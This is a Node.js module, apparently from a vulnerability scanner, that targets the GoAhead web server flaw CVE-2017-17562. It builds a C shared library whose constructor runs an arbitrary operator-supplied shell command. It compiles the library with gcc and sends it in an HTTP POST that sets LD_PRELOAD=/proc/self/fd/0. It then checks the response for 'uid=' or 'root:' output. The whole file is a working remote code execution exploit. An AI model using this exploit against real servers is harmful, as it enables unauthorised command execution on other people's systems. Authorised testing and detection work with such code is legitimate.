
module.exports={
	tags:"CVE-2017-17562,goahead,web",
	des:"GoAhead 远程命令执行漏洞（CVE-2017-17562） Vulnerability detection",
	dependencies:"gcc,c lib,rm(/tmp/xx)",
	VulApps:[
		"https://github.com/vulhub/vulhub/tree/master/goahead/CVE-2017-17562"],
	urls:[
		"https://stackoverflow.com/questions/19209141/how-do-i-execute-a-shell-built-in-command-with-a-c-function"],
	doCheck:function (url,fnCbk)
	{
		var _t = this,_s = this.self, hst = _s.parseUrl(url),szCmd = _s.g_szCmd.replace(/"/gmi,"\\\""),
			nT = new Date().getTime(),szPfl = "/tmp/" + nT + ".so",
			szTmpFl = `/tmp/${nT}.c`;
		// [fonts]  root:
		var szCGI = `#include <unistd.h>
#include <stdlib.h>
static void before_main(void) __attribute__((constructor));
static void before_main(void)
{
	system("${szCmd}");
}`;
	_s.fs.writeFileSync(szTmpFl,szCGI)
	var szMkPay = _s.child_process.execSync("gcc -shared -fPIC "+ szTmpFl + " -o " + szPfl).toString("utf-8").trim(),
		bin_pay = "";
	if(szMkPay)_s.log(szMkPay);
	if(_s.fs.execSync(szPfl))
	{
		bin_pay = _s.fs.readFileSync(szPfl);
		var fnT =function(u)
		{
			var szPaload = `POST /cgi-bin/index?LD_PRELOAD=/proc/self/fd/0 HTTP/1.1
Accept: */*
Host: ${hst.host}
User-Agent: ${_s.g_szUa}
Connection: close

${bin_pay}`;
			_s.fnSocket(hst.hostname,hst.port,szPaload,function(s)
			{
				_s.log(s);
				var r = {"url":url,"send":szPaload,payload:szCGI};
				if(/(uid=)|(root:)/gmi.test(s))
				{
					r.result = s;
					r.vul = true;
					fnCbk(r,_t);
				}
			});
		};
		fnT(url);
	}
	_s.child_process.execSync("rm -rf " + szTmpFl + " " + szPfl);
	}
};